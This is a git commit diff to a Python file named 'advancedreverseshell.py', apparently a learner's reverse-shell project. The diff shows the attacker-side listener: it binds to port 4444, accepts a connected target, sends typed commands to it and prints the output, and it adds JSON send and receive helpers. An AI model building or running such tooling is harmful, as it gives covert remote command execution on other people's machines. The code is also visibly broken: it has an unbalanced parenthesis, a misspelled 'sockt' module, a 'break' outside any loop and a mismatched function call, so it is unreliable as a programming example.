066c8b6cbef505e50654ca2dbbdec0312eb5dbd7
Pooja Nokhwal <poojanokhwal04@gmail.com>
2025-06-11 16:44:53 +0530

    Continued..

--- AdvancedReverseShell/advancedreverseshell.py
+++ AdvancedReverseShell/advancedreverseshell.py
@@ -1,20 +1,34 @@
+import json
 import socket
 import subprocess
 
+def reliable_send(data):
+    json_data=json.dumps(data)
+    target.send(json_data)
+
+def reliable_recv():
+    data=""
+    while True:
+        try:
+            data=data+target.recv(1024)
+            return json.loads((data)
+        except:
+            continue
+
 def shell():
-  command=input("Command: %s" %str(ip))
-  target.send(command)
-  if command=="q":
-      break
-  else
-      result=target.recv(1024)
-      print(result)
+    command=input("Command: %s" %str(ip))
+    reliable_send(command)
+    if command=="q":
+        break
+    else:
+        result=reliable_recv(1024)
+        print(result)
      
 def server():
       global s
       global ip
       global target
-      s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s=sockt.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
       s.bind(("192.168.0.1", 4444))
       s.listen(5)
